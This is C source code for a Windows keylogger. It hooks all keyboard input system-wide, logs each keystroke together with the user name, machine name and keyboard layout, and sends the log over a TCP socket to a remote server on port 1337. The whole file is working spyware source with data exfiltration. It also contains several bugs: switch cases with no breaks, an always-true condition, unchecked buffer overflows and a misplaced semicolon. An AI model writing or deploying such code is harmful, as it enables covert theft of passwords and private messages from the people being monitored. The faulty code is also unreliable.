#include <windows.h>
#include <stdio.h>

char buffer[100];

LRESULT CALLBACK keysin(int code, WPARAM wparam, LPARAM lparam)
{
	char buffer_holder[5];
	char buffer_holder2[75];
	WCHAR wbuffer[5];
	PKBDLLHOOKSTRUCT kbdll;
	BYTE kb_state[256];
	HKL layout;
    char layoutname[KL_NAMELENGTH];
    TCHAR local_machinename[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD machine_buff = sizeof(local_machinename) / sizeof(local_machinename[0]);
	
	if(code == HC_ACTION && (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN))
	{
		kbdll = (PKBDLLHOOKSTRUCT)lparam;
		switch(kbdll->vkCode)
		{
			case VK_RETURN:
				strcat(buffer," RETURN ");
				CallNextHookEx(NULL,code,wparam,lparam);
			case VK_BACK:
				strcat(buffer," BACK ");
				CallNextHookEx(NULL,code,wparam,lparam);
			case VK_DELETE:
				strcat(buffer," DEL ");
				CallNextHookEx(NULL,code,wparam,lparam);
			case VK_TAB:
				strcat(buffer," TAB ");
				CallNextHookEx(NULL,code,wparam,lparam);
			case VK_UP:
				strcat(buffer," UP ");
				CallNextHookEx(NULL,code,wparam,lparam);
			case VK_DOWN:
				strcat(buffer," DWN ");
				CallNextHookEx(NULL,code,wparam,lparam);
			case VK_RIGHT:
				strcat(buffer," RGHT ");
				CallNextHookEx(NULL,code,wparam,lparam);
			case VK_LEFT:
				strcat(buffer," LFT ");
				CallNextHookEx(NULL,code,wparam,lparam);
            case VK_CAPITAL:
                CallNextHookEx(NULL,code,wparam,lparam);
		}

		if(kbdll->vkCode == VK_CAPITAL || VK_SHIFT || VK_CONTROL || VK_MENU)
		{
			GetKeyState(kbdll->vkCode);
		}
		layout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(),NULL));
		GetKeyboardState(kb_state);

		ToUnicodeEx(kbdll->vkCode, kbdll->scanCode, kb_state, wbuffer,sizeof(wbuffer),0,layout);
		printf("Normal output: %s",wbuffer);

		sprintf(buffer_holder,"%s",wbuffer);
		strcat(buffer, buffer_holder);

		printf("\nBuffer: %s\n", buffer);

		if(strlen(buffer) > ((sizeof(buffer) / 5) * 4))
		{
			char* username = getenv("USERNAME");
			GetKeyboardLayoutName(layoutname);
			GetComputerName(local_machinename, &machine_buff);
            sprintf(buffer_holder2,"\n%s - %s\nLayout: %s",username,local_machinename,layoutname);
            strcat(buffer, buffer_holder2);
            printf("\nSending buffer\n");
 			if(send_buffer(buffer) != 0);
 			{
 				printf("Send_buffer failed");
			}
 			printf("\nBuffer sent\n");
			memset(buffer,'\0',sizeof(buffer));
		}
	}
	CallNextHookEx(NULL,code,wparam,lparam);
}

int send_buffer(char buffer[]) // returns 1 if fails, 0 if none errors 
{

    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0)
    {
    	printf("WSAS initialization failed\n");
        return 1;
    }
    /*
    char hostname[] = "yourhostname";
    struct hostent *server_name;
    if((server_name = gethostbyname(hostname)) == NULL)
    {
        return 1;
    }
	*/
    SOCKET win_socket;
    if((win_socket = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    {
    	printf("Winsock failed\n");
        return 1;
    }
    
    struct sockaddr_in server;
    //memcpy(&server.sin_addr, server_name->h_addr_list[0], server_name->h_length);
    server.sin_family = AF_INET;
    server.sin_port = htons(1337);
    server.sin_addr.s_addr = inet_addr("0.0.0.0");
    
    if((connect(win_socket,(SOCKADDR*)&server, sizeof(server))) == SOCKET_ERROR)
    {
    	printf("Failed connection\n");
    	return 1;
    }

    if(send(win_socket, buffer, strlen(buffer), 0) > 0)
    {
        closesocket(win_socket);
        return 0;
    }
    
}
int main()
{
	HHOOK key_hook;
	key_hook = SetWindowsHookEx(WH_KEYBOARD_LL, keysin,0,0);
	MSG msg;
	while(GetMessage(&msg, NULL, 0, 0) > 0)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	UnhookWindowsHookEx(key_hook);
	return 0;
}
